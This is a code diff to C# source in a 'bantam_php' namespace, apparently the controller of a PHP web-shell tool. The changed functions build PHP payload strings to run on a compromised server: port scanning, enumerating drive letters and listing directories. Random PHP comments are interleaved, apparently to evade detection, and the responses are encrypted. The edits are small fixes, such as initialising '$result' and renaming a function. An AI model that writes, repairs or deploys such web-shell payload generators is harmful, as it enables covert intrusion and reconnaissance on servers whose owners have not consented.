@@ -294,7 +294,7 @@ namespace bantam_php
         {
             if (encryptResponse) {
                 return RandomPHPComment()
-                     + "$result;"
+                     + "$result='';"
                      + "@ini_set('max_execution_time', 0);"
                      + portsCode
                      + "foreach ($ports as $port) {"
@@ -350,7 +350,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="encryptReponse"></param>
         /// <returns></returns>
-        public static string PhpTestExecutionWithEcho(bool encryptReponse)
+        public static string PhpTestExecutionWithEcho1(bool encryptReponse)
         {
             string phpTestExecutionWithEcho = string.Empty;
             if (encryptReponse) {
@@ -378,7 +378,7 @@ namespace bantam_php
 
             if (encryptResponse) {
                 getHardDriveLetters = RandomPHPComment()
-                                        + "$result; foreach (range('a', 'z') as " + driveVar + ") {"
+                                        + "$result=''; foreach (range('a', 'z') as " + driveVar + ") {"
                                     + RandomPHPComment()
                                         + "if (is_dir(" + driveVar + @". ':\\')) { "
                                     + RandomPHPComment()
@@ -513,6 +513,7 @@ namespace bantam_php
 
             if (responseEncryption) {
                 return RandomPHPComment() 
+                 + @"$result='';"
                  + @" try{ " + RandomPHPComment() 
                  + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment() 
                  + @"$result .= " + varItem + "->getBasename().'" + g_delimiter + "'."
